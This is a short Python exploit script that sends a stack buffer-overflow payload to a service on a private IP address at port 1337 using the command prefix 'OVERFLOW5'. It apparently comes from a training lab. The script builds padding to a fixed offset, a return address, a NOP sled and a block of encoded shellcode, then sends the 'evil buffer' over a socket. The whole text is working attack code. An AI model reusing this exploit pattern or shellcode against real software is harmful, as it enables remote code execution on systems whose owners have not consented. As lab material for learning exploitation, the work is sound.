import socket

ip = "10.10.66.178"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 22
payload = ("\xfc\xbb\x1d\x9c\xa0\xd6\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe1\x74\x22"
"\xd6\x19\x85\x43\x5e\xfc\xb4\x43\x04\x75\xe6\x73\x4e\xdb"
"\x0b\xff\x02\xcf\x98\x8d\x8a\xe0\x29\x3b\xed\xcf\xaa\x10"
"\xcd\x4e\x29\x6b\x02\xb0\x10\xa4\x57\xb1\x55\xd9\x9a\xe3"
"\x0e\x95\x09\x13\x3a\xe3\x91\x98\x70\xe5\x91\x7d\xc0\x04"
"\xb3\xd0\x5a\x5f\x13\xd3\x8f\xeb\x1a\xcb\xcc\xd6\xd5\x60"
"\x26\xac\xe7\xa0\x76\x4d\x4b\x8d\xb6\xbc\x95\xca\x71\x5f"
"\xe0\x22\x82\xe2\xf3\xf1\xf8\x38\x71\xe1\x5b\xca\x21\xcd"
"\x5a\x1f\xb7\x86\x51\xd4\xb3\xc0\x75\xeb\x10\x7b\x81\x60"
"\x97\xab\x03\x32\xbc\x6f\x4f\xe0\xdd\x36\x35\x47\xe1\x28"
"\x96\x38\x47\x23\x3b\x2c\xfa\x6e\x54\x81\x37\x90\xa4\x8d"
"\x40\xe3\x96\x12\xfb\x6b\x9b\xdb\x25\x6c\xdc\xf1\x92\xe2"
"\x23\xfa\xe2\x2b\xe0\xae\xb2\x43\xc1\xce\x58\x93\xee\x1a"
"\xce\xc3\x40\xf5\xaf\xb3\x20\xa5\x47\xd9\xae\x9a\x78\xe2"
"\x64\xb3\x13\x19\xef\xb6\xea\x77\xe3\xae\xee\x77\xea\x72"
"\x66\x91\x66\x9b\x2e\x0a\x1f\x02\x6b\xc0\xbe\xcb\xa1\xad"
"\x81\x40\x46\x52\x4f\xa1\x23\x40\x38\x41\x7e\x3a\xef\x5e"
"\x54\x52\x73\xcc\x33\xa2\xfa\xed\xeb\xf5\xab\xc0\xe5\x93"
"\x41\x7a\x5c\x81\x9b\x1a\xa7\x01\x40\xdf\x26\x88\x05\x5b"
"\x0d\x9a\xd3\x64\x09\xce\x8b\x32\xc7\xb8\x6d\xed\xa9\x12"
"\x24\x42\x60\xf2\xb1\xa8\xb3\x84\xbd\xe4\x45\x68\x0f\x51"
"\x10\x97\xa0\x35\x94\xe0\xdc\xa5\x5b\x3b\x65\xc5\xb9\xe9"
"\x90\x6e\x64\x78\x19\xf3\x97\x57\x5e\x0a\x14\x5d\x1f\xe9"
"\x04\x14\x1a\xb5\x82\xc5\x56\xa6\x66\xe9\xc5\xc7\xa2\xe9"
"\xe9\x37\x4d")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
